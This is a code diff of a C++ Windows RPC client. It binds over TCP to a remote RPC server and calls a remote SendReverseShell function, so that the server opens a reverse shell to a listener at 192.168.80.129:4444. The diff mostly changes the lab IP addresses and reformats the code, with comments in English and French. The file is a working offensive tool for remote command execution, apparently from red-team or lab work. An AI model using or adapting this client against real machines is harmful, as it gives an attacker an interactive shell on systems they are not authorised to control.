@@ -1,56 +1,54 @@
 #include <iostream>
-#include "RemotePrivilegeCall.h"
 #include <windows.h>
-// Links the rpcrt4.lib which exposes the WinAPI RPC functions
+#include "RemotePrivilegeCall.h"
+// Links the rpcrt4.lib that exposes the WinAPI RPC functions
 #pragma comment(lib, "rpcrt4.lib")
 
 int main()
 {
-   RPC_STATUS status;               // Used to store the RPC functions returns
-   RPC_WSTR szStringBinding = NULL; // Stores the string binding
+	RPC_STATUS status;                 // Store the RPC status
+	RPC_WSTR szStringBinding = NULL;   // Store the binding string
 
-   // Creates the binding string
-   status = RpcStringBindingCompose(
-      NULL,                      // UUID of the interface (since there is only one interface we can use the NULL value)
-      (RPC_WSTR)L"ncacn_ip_tcp", // TCP endpoint
-      (RPC_WSTR)L"192.168.0.44", // IP address of the remote server
-      (RPC_WSTR)L"41337",        // Port on which the interface is listening
-      NULL,                      // Network protocole to use
-      &szStringBinding);         // Used to store the binding string.
+	// Used to get a valid binding string
+	status = RpcStringBindingComposeW(
+		NULL,                        // UUID of the interface
+		(RPC_WSTR)L"ncacn_ip_tcp",   // TCP binding 
+		(RPC_WSTR)L"192.168.80.139", // Server IP address
+		(RPC_WSTR)L"41337",          // Port on which the interface is listening
+		NULL,                        // Network protocol to use
+		&szStringBinding             // Variable in which the binding string is to be stored
+	);          
+   
+	printf("BindingString: %s\n", szStringBinding);
+	
+	// Validates the binding string and retrieves a binding handle
+	status = RpcBindingFromStringBindingW(
+		szStringBinding,      // The binding string to validate
+		&ImplicitHandle       // The variable in which is stored the binding handle
+	);   
+	
+	RpcTryExcept{
+		// Calls the remote function
+		SendReverseShell(L"192.168.80.129", 4444);
+	}
+	RpcExcept(1){
+		printf("RPCExec: %d\n", RpcExceptionCode());
+	}
+	RpcEndExcept
 
-   // Binds to the interface using the string binding
-   status = RpcBindingFromStringBinding(
-      szStringBinding,      // Binding string to validate
-      &ImplicitHandle);     // Stores the results in the binding handle
+	// Libère la mémoire allouée à la chaîne de caractère binding
+	status = RpcStringFreeW(&szStringBinding);
 
-   RpcTryExcept
-   {
-      // Calls the remote SendReverseShell function
-      SendReverseShell(
-		reinterpret_cast<unsigned char*>("192.168.0.23"),
-		4444
-	  );
-   }
-   RpcExcept(1)
-   {
-      printf("Runtime error %d", RpcExceptionCode())
-   }
-   RpcEndExcept
-
-   // Frees the memory allocated to the binding string
-   status = RpcStringFree(&szStringBinding);
-
-   // Disconnects from the binding
-   status = RpcBindingFree(&ImplicitHandle); 
+	// Libère le binding handle et déconnecte du serveur RPC
+	status = RpcBindingFree(&ImplicitHandle); 
 }
 
-void* __RPC_USER midl_user_allocate(size_t size)
-{
+// Function used to allocate memory to the interface
+void* __RPC_USER midl_user_allocate(size_t size){
     return malloc(size);
 }
 
-// Fonction permettant de désallouée la mémoire de l'interface RPC
-void __RPC_USER midl_user_free(void* p)
-{
+// Function used to free memory allocated to the interface
+void __RPC_USER midl_user_free(void* p){
     free(p);
 }
